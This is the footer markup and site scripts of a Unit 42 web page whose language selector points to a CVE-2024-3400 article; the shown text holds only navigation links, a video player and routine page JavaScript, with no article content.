							<a href="https://www.paloaltonetworks.com/network-security/enterprise-iot-security"   role="link" title="IoT Security" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security">IoT Security</a>
						</li>    
					        
					</ul>
				</nav>
																		<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security/next-generation-firewall"   role="link" title="Next-Generation Firewalls" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls">Next-Generation Firewalls</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/next-generation-firewall-hardware"   role="link" title="Hardware Firewalls" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls">Hardware Firewalls</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/strata-cloud-manager"   role="link" title="Strata Cloud Manager" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager">Strata Cloud Manager</a>
						</li>    
					        
					</ul>
				</nav>
																		<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/sase"   role="link" title="SECURE ACCESS SERVICE EDGE" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE">SECURE ACCESS SERVICE EDGE</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/access"   role="link" title="Prisma Access" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access">Prisma Access</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/sd-wan"   role="link" title="Prisma SD-WAN" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN">Prisma SD-WAN</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/adem"   role="link" title="Autonomous Digital Experience Management" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management">Autonomous Digital Experience Management</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/next-gen-casb"   role="link" title="Cloud Access Security Broker" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management:Cloud Access Security Broker">Cloud Access Security Broker</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/ztna"   role="link" title="Zero Trust Network Access" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management:Cloud Access Security Broker:Zero Trust Network Access">Zero Trust Network Access</a>
						</li>    
					        
					</ul>
				</nav>
						         
            </div>
            <div class="nav-column">
                          													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/prisma/whyprisma"   role="link" title="Code to Cloud Platform" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform">Code to Cloud Platform</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/prisma/cloud"   role="link" title="Prisma Cloud" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform:Prisma Cloud">Prisma Cloud</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/content/pan/en_US/prisma/cloud/cloud-native-application-protection-platform"   role="link" title="Cloud-Native Application Protection Platform" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform:Prisma Cloud:Cloud-Native Application Protection Platform">Cloud-Native Application Protection Platform</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/cortex" target=_blank  role="link" title="AI-Driven Security Operations Platform" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform">AI-Driven Security Operations Platform</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xdr"   role="link" title="Cortex XDR" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR">Cortex XDR</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xsoar"   role="link" title="Cortex XSOAR" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR">Cortex XSOAR</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xpanse"   role="link" title="Cortex Xpanse" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse">Cortex Xpanse</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xsiam"   role="link" title="Cortex XSIAM" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM">Cortex XSIAM</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xpanse/attack-surface-management"   role="link" title="External Attack Surface Protection" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection">External Attack Surface Protection</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/security-operations-automation"   role="link" title="Security Automation" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection:Security Automation">Security Automation</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/detection-and-response"   role="link" title="Threat Prevention, Detection &amp; Response" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection:Security Automation:Threat Prevention, Detection &amp; Response">Threat Prevention, Detection &amp; Response</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/unit42"   role="link" title="Threat Intel and Incident Response Services" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services">Threat Intel and Incident Response Services</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/assess"   role="link" title="Proactive Assessments" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments">Proactive Assessments</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/respond"   role="link" title="Incident Response" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response">Incident Response</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/transform"   role="link" title="Transform Your Security Strategy" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response:Transform Your Security Strategy">Transform Your Security Strategy</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/threat-intelligence-partners"   role="link" title="Discover Threat Intelligence" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response:Transform Your Security Strategy:Discover Threat Intelligence">Discover Threat Intelligence</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
          </div>
        </div>
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Company</h3>
                                <div class="nav-column__wrapper">
          <div class="nav-column">
            													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us"   role="link" title="About Us" data-page-track="true" data-page-track-value="footer:Company:About Us">About Us</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://jobs.paloaltonetworks.com/en/"   role="link" title="Careers" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers">Careers</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/company/contact-sales"   role="link" title="Contact Us" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us">Contact Us</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us/corporate-responsibility"   role="link" title="Corporate Responsibility" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility">Corporate Responsibility</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/customers"   role="link" title="Customers" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers">Customers</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://investors.paloaltonetworks.com/" target=_blank  role="link" title="Investor Relations" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations">Investor Relations</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us/locations"   role="link" title="Location" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations:Location">Location</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/company/newsroom"   role="link" title="Newsroom" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations:Location:Newsroom">Newsroom</a>
						</li>    
					        
					</ul>
				</nav>
						          </div>
          </div>
        </div>
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Popular links</h3>
                                <div class="nav-column__wrapper">
          <div class="nav-column">
            													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/blog/"   role="link" title="Blog" data-page-track="true" data-page-track-value="footer:Popular links:Blog">Blog</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/communities"   role="link" title="Communities" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities">Communities</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/resources"   role="link" title="Content Library" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library">Content Library</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cyberpedia"   role="link" title="Cyberpedia" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia">Cyberpedia</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://events.paloaltonetworks.com/"   role="link" title="Event Center" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center">Event Center</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://start.paloaltonetworks.com/preference-center"   role="link" title="Manage Email Preferences" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences">Manage Email Preferences</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/products/products-a-z"   role="link" title="Products A-Z" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z">Products A-Z</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/legal-notices/trust-center/tech-certs"   role="link" title="Product Certifications" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications">Product Certifications</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/security-disclosure"   role="link" title="Report a Vulnerability" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability">Report a Vulnerability</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sitemap"   role="link" title="Sitemap" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap">Sitemap</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://docs.paloaltonetworks.com/"   role="link" title="Tech Docs" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs">Tech Docs</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://unit42.paloaltonetworks.com/"   role="link" title="Unit 42" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs:Unit 42">Unit 42</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://panwedd.exterro.net/portal/dsar.htm?target=panwedd" target=_blank  role="link" title="Do Not Sell or Share My Personal Information" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs:Unit 42:Do Not Sell or Share My Personal Information">Do Not Sell or Share My Personal Information</a>
						</li>    
					        
					</ul>
				</nav>
						          </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="footer-bottom"> 
    <div class="l-container"> 
              <div class="footer-logo">
          <a href="https://www.paloaltonetworks.com/" role="link" title="Footer Nav" data-page-track="true" data-page-track-value="footer:logo:Palo Alto Networks">
            <img width="245" height="46" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/palo-alto-footer-logo.svg" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" />          </a>
        </div>
            <div class="footer-bottom__wrapper"> 
        <div class="footer-bottom-nav">
                                              <nav>
                <ul class="footer-menu-nav__list"> 
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/privacy"   role="link" title="Privacy" data-page-track="true" data-page-track-value="footer:bottom-menu:Privacy">Privacy</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/trust-center"   role="link" title="Trust Center" data-page-track="true" data-page-track-value="footer:bottom-menu:Trust Center">Trust Center</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use"   role="link" title="Terms of Use" data-page-track="true" data-page-track-value="footer:bottom-menu:Terms of Use">Terms of Use</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal"   role="link" title="Documents" data-page-track="true" data-page-track-value="footer:bottom-menu:Documents">Documents</a>
                  </li>    
                        
                </ul>
              </nav>
                                            <br/><span class="copyright">Copyright © 2025 Palo Alto Networks. All Rights Reserved</span>
                  </div>
        <div class="footer-bottom-social"> 
          <ul> 
			<li>
			<a href="https://www.youtube.com/user/paloaltonetworks" target="_blank" role="link" title="YouTube" data-page-track="true" data-page-track-value="footer:social:Youtube">
				<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/youtube-black.svg" alt="YouTube">
			</a>
		</li>
				<li> 
			<a href="https://twitter.com/Unit42_Intel" target="_blank" role="link" title="X" data-page-track="true" data-page-track-value="footer:social::Twitter">
				<img  class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/x-icon-black.svg" alt="Twitter">
			</a>
		</li>
				<li> 
			<a href="https://www.facebook.com/PaloAltoNetworks/" target="_blank" role="link" title="Facebook" data-page-track="true" data-page-track-value="footer:social:Facebook">
				<img  class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/Facebook_Icon.svg" alt="Facebook">
			</a>
		</li>
				<li> 
			<a href="https://www.linkedin.com/company/palo-alto-networks" target="_blank" role="link" title="LinkedIn" data-page-track="true" data-page-track-value="footer:social:LinkedIn">
				<img  class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/LinkedIn_Icon.svg" alt="LinkedIn">
			</a>
		</li>
	                <li> 
			<a href="https://unit42.paloaltonetworks.com/unit-42-threat-vector-podcast/" role="link" title="Podcast" data-page-track="true" data-page-track-value="footer:social:Podcast">
                            <img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/Podcast.svg" alt="Podcast">
			</a>
		</li>
</ul>          
	<div class="pa language-dropdown">
			<div class="language-dropdown__wrapper"> 
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/globe-icon.svg" alt="Globe icon">
			<span id="selectedLanguage">EN</span>
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg" alt="Down arrow"><ul><li class="title">Select your language</li>
					<li class="selected" data-value="en"> 
						<a data-page-track="true" data-page-track-value="footer:language-selector:en" href="https://unit42.paloaltonetworks.com/cve-2024-3400/">USA (ENGLISH)</a>
					</li>
					<li class="non-active" data-value="en"> 
						<a data-page-track="true" data-page-track-value="footer:language-selector:ja" href="https://unit42.paloaltonetworks.jp/cve-2024-3400/">JAPAN (日本語)</a>
					</li></ul>        </div>
      </div>
    </div>
  </div>
</footer>
<div class="dd-overlay">
</div>
<!--  Start: video modal -->
<div class="modal video__modal" id="videoModal" tabindex="-1">
        <div class="modal__video-wrapper">
          <button class="modal__play-btn is-minimized is-paused" id="playPauseBtn">
            <img class="play" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg" alt="Play">
            <img class="pause" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg" alt="Pause">
          </button>
          <button class="modal__minimize-btn is-minimized">
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg" alt="Minimize">
          </button>
          <button class="modal__close"> 
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg" alt="Close button">
          </button>
          <video class="modal__video" id="customVideo">
            <source src="" type="video/mp4">Your browser does not support the video tag.
          </video>
          <div class="modal__post-details" tabindex="-1">       
              <h3>Default Heading</h3>
              <a class="l-btn" href="#" title="Right Arrow Icon" role="link" data-page-track="true" data-page-track-value="overview:explore reports:View all reports">Read the article
              <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg" alt="Right Arrow">
              </a>
          </div>
          <div class="modal__video-controls">
            <div class="modal__video-seekbar input__wrapper"><span></span>
              <label class="is-hidden" for="modalSeekBar">Seekbar</label>
              <input class="custom-range" id="modalSeekBar" type="range" min="0" max="100" value="1">
              <p class="modal__remaining-time"></p>
            </div>
            <button class="modal__play-btn is-paused" id="playPauseBtn">
            <img class="play" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg" alt="Play">
            <img class="pause" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg" alt="Pause">
          </button>
            <div class="modal__volume-controls">
              <div class="modal__volume__wrapper">
                <button tabindex="0">
                  <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-volume.svg" alt="Volume">
                </button>
                <div class="modal__volume-seekbar"><span></span>
                  <label class="is-hidden" for="volumeBar">Volume</label>
                  <input class="volume__bar" id="volumeBar" type="range" min="0" max="1" step="0.1" value="0.7">
                </div>
              </div>
              <button class="modal__minimize-btn" id="minimizeBtn">
                <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg" alt="Minimize">
              </button>
            </div>
          </div>
        </div>
      </div><!--  End: video modal -->

    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		var like_nonce = jQuery('#_wpnonce').val();
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type+"&ul_nonce="+like_nonce,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
    <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=6.6.2' media='all' />
<script src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/js/script.js?ver=1.0.0" id="unit42-v6-navigation-js"></script>

<!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
const observer_lozad = lozad('.lozad, .lozad-background'); // lazy loads elements with default selector as '.lozad'
observer_lozad.observe();

window.PAN_Clean_Util = {
        isIE: false
};

(function () {
   // INP Util Fix
    function yieldToMain(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
   window.PAN_Clean_Util.yieldToMain = yieldToMain
})();

if(referer == "Prisma" || referer == "Cortex" || referer == "Sase" || referer == "Unit" || referer == "Ngfw"){
  var Coveo_organizationId = "paloaltonetworksintranet";        
  var techDocsPagePath = "https://docs.paloaltonetworks.com/search.html#hd=All%20Prisma%20Cloud%20Documentation&hq=%40panproductcategory%3D%3D(%22Prisma%20Cloud%22)&sort=relevancy&layout=card&numberOfResults=25";
  var languageFromPath="en_US";
  window.Granite = window.Granite || {};
  Granite.I18n = (function() {
  var self = {};
  self.setLocale = function(locale) { };
  self.get = function(text, snippets, note) {
    var out = "";
    if(text){
      if(text ==="coveo.clear"){
        out = "Clear";
      }else if(text ==="coveo.noresultsfound"){
        out = "No results found for this search term.";
      }
    }
    return out;
  };
  return self
  }());
}

  var main_site_critical_top = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.js';
  var main_site_defered = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/defered.min.js';
  var main_site_criticalTopBase = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopBase.min.js';
  var main_site_criticalTopProductNav = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.js';
window.PAN_MainNavAsyncUrl = maindomain_lang+"/_jcr_content/globals/cleanHeaderPrisma.prismaRenderer.html";

function loadScript(url, defer){
    var script1 = document.createElement('script');
    script1.setAttribute('type', 'text/javascript');
    script1.setAttribute('src',url);
    if(defer == true){
        script1.setAttribute('defer','defer');
    }
    document.head.appendChild(script1);
}
function loadScript1(url, callback){

    var script = document.createElement("script")
    script.type = "text/javascript";
    if (script.readyState){  //IE
        script.onreadystatechange = function(){
            if (script.readyState == "loaded" || script.readyState == "complete"){
                script.onreadystatechange = null;
                callback();
            }
        };
    } else {  //Others
        script.onload = function(){
            callback();
        };
    }
    script.src = url;
    document.getElementsByTagName("head")[0].appendChild(script);
}
if(referer == "Prisma" || referer == "Cortex" || referer == "Sase" || referer == "Unit" || referer == "Ngfw"){
	if(referer == "Unit"){
    setTimeout(function(){
      loadScript(main_site_criticalTopBase, false);
      loadScript1(main_site_criticalTopProductNav, function(){
        window.PAN_initializeProduct2021Nav();
      });
      loadScript(main_site_defered, false);
    }, 3000);
	}
	else{
    setTimeout(function(){
      loadScript1(main_site_critical_top, function(){
        window.PAN_initializeProduct2021Nav();
      });
      loadScript(main_site_defered, false);
    }, 3000);
	}
}

$(document).ready(function () {
    setTimeout(function(){
      $('.article-banner .ab__options ul li a').each(function(){
          	$(this).attr('target', "_blank");
      });
    }, 4000);
});
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->

</body>
</html>
